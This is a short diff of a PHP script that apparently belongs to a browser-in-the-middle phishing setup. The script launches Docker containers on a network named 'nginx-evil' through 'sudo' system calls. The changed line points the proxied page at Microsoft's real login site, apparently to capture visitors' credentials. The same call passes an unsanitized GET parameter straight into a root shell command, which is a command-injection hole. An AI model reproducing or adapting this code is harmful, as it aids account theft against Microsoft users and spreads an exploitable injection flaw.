@@ -63,7 +63,7 @@ if (is_writable($filename)) {
     fclose($fp);
     $resolu = $_GET['x'];
     echo $uidphp;
-    system("sudo docker run -d --rm   -e FOLDER=".$uidphp." -e RESOLUTION=".$resolu."x24 -e WEBPAGE=webpage --network=nginx-evil --name ".$uidphp." idimage > /dev/null");
+    system("sudo docker run -d --rm   -e FOLDER=".$uidphp." -e RESOLUTION=".$resolu."x24 -e WEBPAGE=https://login.microsoftonline.com --network=nginx-evil --name ".$uidphp." idimage > /dev/null");
 
     system('sudo nginx -s reload');
 }
